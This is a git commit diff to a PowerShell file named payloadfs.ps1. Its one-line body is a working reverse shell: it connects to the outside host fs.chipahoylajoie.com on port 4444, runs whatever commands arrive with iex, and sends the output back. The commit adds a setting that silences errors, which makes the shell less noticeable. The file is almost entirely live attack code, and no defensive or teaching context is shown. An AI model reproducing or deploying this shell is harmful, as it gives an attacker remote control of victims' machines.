cce4e55b280ea4608adbc731ff6a200f3d402270
David Lajoie <46324931+dclajoie@users.noreply.github.com>
2021-01-19 15:07:05 -0600

    Update payloadfs.ps1

--- payloadfs.ps1
+++ payloadfs.ps1
@@ -1,1 +1,2 @@
+$ErrorActionPreference='SilentlyContinue'
 $sm=(New-Object Net.Sockets.TCPClient('fs.chipahoylajoie.com',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
